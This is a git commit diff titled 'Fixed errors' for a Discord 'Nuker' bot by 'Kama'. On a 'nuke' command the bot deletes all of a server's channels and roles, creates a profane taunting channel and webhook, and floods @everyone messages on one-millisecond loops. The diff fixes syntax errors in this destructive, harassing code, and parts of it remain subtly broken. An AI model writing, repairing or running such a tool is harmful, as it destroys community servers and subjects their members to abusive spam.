02b03a0d4a7e166921d3359192341ead848081e9
Kama <steamnitz@gmail.com>
2023-02-27 02:22:37 +0100

    Fixed errors

--- index.js
+++ index.js
@@ -13,49 +13,48 @@ const client = new Client({
   partials: [User, Message, GuildMember, ThreadMember],
 });
 client.config = require("./config.json");
+let aSName = `
 
-client.on('ready', () => {
-  let aSName = `
-
- ▄▄▄       ██▀███  ▒███████▒▓█████  ██▀███   ▒█████  ▒██   ██▒  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
+▄▄▄       ██▀███  ▒███████▒▓█████  ██▀███   ▒█████  ▒██   ██▒  ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
 ▒████▄    ▓██ ▒ ██▒▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
 ▒██  ▀█▄  ▓██ ░▄█ ▒░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒░░  █   ░░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
 ░██▄▄▄▄██ ▒██▀▀█▄    ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒   ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
- ▓█   ▓██▒░██▓ ▒██▒▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
- ▒▒   ▓▒█░░ ▒▓ ░▒▓░░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
-  ▒   ▒▒ ░  ░▒ ░ ▒░░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
-  ░   ▒     ░░   ░ ░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒   ░    ░  ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
-      ░  ░   ░       ░ ░       ░  ░   ░         ░ ░   ░    ░        ░                 ░  ░       ░          ░      ░  ░   ░     
-                   ░                                                                                                            
-                                            
-                                                      
-                            Dev by Kama
-                    Nuker: ${client.user.tag}
-                    Prefix: ${client.config.prefix}
-    `;
+▓█   ▓██▒░██▓ ▒██▒▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
+▒▒   ▓▒█░░ ▒▓ ░▒▓░░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
+ ▒   ▒▒ ░  ░▒ ░ ▒░░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░ ░░   ░▒ ░░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
+ ░   ▒     ░░   ░ ░ ░ ░ ░ ░   ░     ░░   ░ ░ ░ ░ ▒   ░    ░  ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
+     ░  ░   ░       ░ ░       ░  ░   ░         ░ ░   ░    ░        ░                 ░  ░       ░          ░      ░  ░   ░     
+                  ░                                                                                                            
+                                           
+                                                     
+                           Dev by Kama
+                   Nuker: ${client.user.tag}
+                   Prefix: ${client.config.prefix}
+   `;
+client.on('ready', () => {
   console.clear();
-  console.log(red(aSName))
-}
+  console.log(red(aSName));
+});
 
 client.on('message', async (message) => {
-if( message.content.toLowerCase().startsWith(client.config.prefix + "nuke") {
+if( message.content.toLowerCase().startsWith(client.config.prefix + "nuke")) {
   message.guild.channels.forEach(channel => channel.delete());
   message.guild.roles.cache.forEach(roles => {
     roles.delete()
     .then(deleted => console.log(`Deleted role ${deleted.name}`))
     .catch(console.error);
   });
-  message.guild.channels.create(`Fucked by ${message.author.username}`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) })
+  message.guild.channels.create(`Fucked by ${message.author.username}`, { type: "GUILD_TEXT" }).catch((err) => { console.log(red("Error Found: " + err)) });
   message.channel.createWebhook(`Fucked by ${message.author.username}`)
     .then(wb => message.channel.send(`@everyone you are getting fucked by ${message.author.username} and God Kama`))
     .catch(console.error)
     setInterval(() => {
-      message.guild.channels.forEach(channel => channel.wb.send("@everyone fucked by Kama"})
+      message.guild.channels.forEach(channel => channel.wb.send("@everyone fucked by Kama"))
     }, 1);
     setInterval(() => {
-      message.guild.channels.forEach(channel => channel.wb.send("@everyone dev by Kama"})
+      message.guild.channels.forEach(channel => channel.wb.send("@everyone dev by Kama"))
     }, 1);
   }
-}
+});
 
 client.login(client.config.TOKEN);
